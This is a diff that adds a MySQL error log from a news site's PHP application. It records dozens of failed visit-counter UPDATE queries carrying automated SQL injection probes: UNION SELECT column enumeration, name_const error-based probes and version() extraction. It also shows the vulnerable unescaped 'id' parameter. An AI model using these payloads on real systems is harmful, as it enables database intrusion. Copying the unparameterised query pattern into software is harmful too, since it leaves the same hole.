@@ -1,0 +1,835 @@
+Time : 21:24:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 21:22:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" union select unhex(hex(version())) -- "x"="x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=772299999" union select unhex(hex(version())) -- "x"="x
+
+Time : 21:22:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' union select unhex(hex(version())) -- 'x'='x' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=772299999' union select unhex(hex(version())) -- 'x'='x
+
+Time : 21:22:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select unhex(hex(version())) -- and 1=1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7722999999.1 union select unhex(hex(version())) -- and 1=1
+
+Time : 21:22:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7722" or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- "x"="x
+
+Time : 21:22:41
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,1' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7722' or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- 'x'='x
+
+Time : 21:22:41
+SQLSTATE[HY000]: General error: 1210 Incorrect arguments to NAME_CONST
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=7722 or (1,2)=(select*from(select name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a) -- and 1=1
+
+Time : 21:22:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) -- /* order by "as /*
+
+Time : 21:22:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) -- /* order by "as /*
+
+Time : 21:22:37
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) -- /* order by "as /*
+
+Time : 21:22:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) -- /* order by "as /*
+
+Time : 21:22:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45) -- /* order by "as /*
+
+Time : 21:22:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45) -- /* order by "as /*
+
+Time : 21:22:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45) -- /* order by "as /*
+
+Time : 21:22:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by "as /*
+
+Time : 21:22:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45) -- /* order by "as /*
+
+Time : 21:22:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45) -- /* order by "as /*
+
+Time : 21:22:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45) -- /* order by "as /*
+
+Time : 21:22:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45) -- /* order by "as /*
+
+Time : 21:22:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45) -- /* order by "as /*
+
+Time : 21:22:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45) -- /* order by "as /*
+
+Time : 21:22:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45) -- /* order by "as /*
+
+Time : 21:22:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45) -- /* order by "as /*
+
+Time : 21:22:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45) -- /* order by "as /*
+
+Time : 21:22:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45) -- /* order by "as /*
+
+Time : 21:22:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45) -- /* order by "as /*
+
+Time : 21:22:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45) -- /* order by "as /*
+
+Time : 21:22:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45) -- /* order by "as /*
+
+Time : 21:22:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45) -- /* order by "as /*
+
+Time : 21:22:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45) -- /* order by "as /*
+
+Time : 21:22:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by ' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45) -- /* order by "as /*
+
+Time : 21:22:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by "as /*' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111" UNION SELECT CHAR(45,120,49,45,81,45) -- /* order by "as /*
+
+Time : 21:22:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=77221111111111111' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45) -- /* order by 'as /*
+
+Time : 21:22:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,' at line 1
